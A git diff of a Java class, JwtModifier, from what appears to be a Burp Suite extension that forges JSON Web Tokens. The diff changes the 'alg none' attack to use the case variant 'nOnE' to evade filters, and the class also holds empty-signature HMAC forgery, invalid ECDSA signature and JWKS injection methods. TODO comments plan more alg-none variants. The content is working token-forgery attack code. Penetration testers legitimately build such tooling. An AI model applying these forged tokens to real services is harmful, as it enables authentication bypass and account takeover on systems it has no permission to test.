@@ -7,18 +7,15 @@ import javax.crypto.Mac;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.IOException;
-import java.io.StringWriter;
-import java.math.BigInteger;
 import java.nio.charset.StandardCharsets;
 import java.security.*;
 import java.security.SignatureException;
 import java.security.interfaces.RSAPublicKey;
 import java.util.Base64;
-import org.bouncycastle.openssl.jcajce.JcaPEMWriter;
+
 import com.nimbusds.jose.jwk.RSAKey;
 
 import org.json.*;
-
 public class JwtModifier {
     private final MontoyaApi api;
     private final SecretKey dummyKey = Keys.secretKeyFor(SignatureAlgorithm.HS256);
@@ -63,12 +60,12 @@ public class JwtModifier {
         String[] jwtParts = jwt.split("\\.");
         return createJwtFromString(jwtParts[0], jwtParts[1], dummyKey.toString());
     }
-
+    //Todo: implement all other algorithm none attacks
     public String algNone(String jwt) {
         String[] jwtParts = jwt.split("\\.");
         JSONObject header = new JSONObject(decodeBase64Url(jwtParts[0]));
 
-        header.put("alg", "none");
+        header.put("alg", "nOnE");
         return encodeBase64Url(header.toString()) + '.' + jwtParts[1] + '.';
     }
 
@@ -77,7 +74,7 @@ public class JwtModifier {
         String combined = jwtParts[0] + '.' + jwtParts[1];
         return combined + '.' + createHmacSha256EmptySignature(combined);
     }
-
+    //Todo: Test implementation with lab or website vulnerable to this attack.
     public String invalidEcdsa(String jwt){
         String[] jwtParts = jwt.split("\\.");
         String header = "ezJ0eXAiOiJKV1QiLCJhbGciOiJFUyI1NiJ9";
@@ -87,7 +84,7 @@ public class JwtModifier {
     }
 
 
-    public String JwksInjection(String jwt){
+    public String jwksInjection(String jwt){
         String[] jwtParts = jwt.split("\\.");
 
         try {
